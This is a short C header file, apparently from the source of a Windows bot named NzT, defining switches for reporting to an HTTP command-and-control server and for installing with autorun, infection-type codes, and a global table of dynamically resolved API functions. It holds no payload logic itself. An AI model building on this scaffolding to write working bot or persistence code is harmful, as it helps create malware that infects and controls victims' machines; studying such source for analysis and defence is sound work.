#ifndef __BOT_H__
#define __BOT_H__

#include "api.h"

#define DEBUG

#define _REPORT							// Report to HTTP C2
#define _INSTALL						// Install to system and autorun

typedef INT	WINERROR;					// One of the Windows error codes defined within winerror.h
#define ERROR_UNSUCCESSFULL	0xffffffff	// Common unsuccessfull code
#define	INVALID_INDEX		(-1)

#define CURRENT_PROCESS (HANDLE)-1
#define API(Function) NzT.Api.p##Function

typedef enum INFECTION_TYPES
{
	RUNNING_INFECTION = 1,
	NEW_INFECTION	  = 2
} INFECTION_TYPE;

typedef struct
{
	API_FUNCTIONS  Api;
	API_MODULES	   Modules;
	CRC			   Crc;
	INFECTION_TYPE Type;
} NzT_T;

extern NzT_T NzT;

#endif __BOT_H__